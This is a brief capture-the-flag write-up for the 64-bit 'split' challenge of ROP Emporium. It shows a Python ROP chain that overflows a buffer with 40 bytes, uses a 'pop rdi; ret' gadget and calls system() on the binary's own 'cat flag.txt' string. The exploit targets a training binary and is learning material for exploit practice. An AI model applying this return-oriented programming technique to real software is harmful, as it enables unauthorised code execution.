# split-64 bit
this is the second challange of the series.    
this time we officially begin our ROP journey. 
![start](https://user-images.githubusercontent.com/60041914/78274381-cc91e600-7518-11ea-91bb-94e1be264290.png)  
our goal according to the instructions at https://ropemporium.com/ is to call system() with "cat flag.txt"     
which is already inside the binary(we have it easy this time)   
![str](https://user-images.githubusercontent.com/60041914/78274656-3611f480-7519-11ea-88bd-102c8c03b29d.png)

here is the original call to system.    
![fuc](https://user-images.githubusercontent.com/60041914/78274508-02cf6580-7519-11ea-8769-e64895616cc4.png)

we see that edi is used as a pointer to the command.   
so our goal is clear. we need to craft a rop chain that puts the address of "cat flag.txt"    
in edi and calls system.          
we find a useful gadget:
```nasm
0x0000000000400883 : pop rdi ; ret
```
and craft a rop chain with it:    
```python

CAT_FLAG=0x00601060 #pointer to bash command to print flag
SYSTEM_ADDR=0x00400810  #place where system is called

exploit=b'A'*40
exploit+=p64(0x00400883)    #pop rdi 
exploit+=p64(CAT_FLAG)  #value of rdi after pop
exploit+=p64(SYSTEM_ADDR)   #call to system
```
pwned.   
![pwned](https://user-images.githubusercontent.com/60041914/78275394-3c54a080-751a-11ea-9614-aa5348b49266.png)
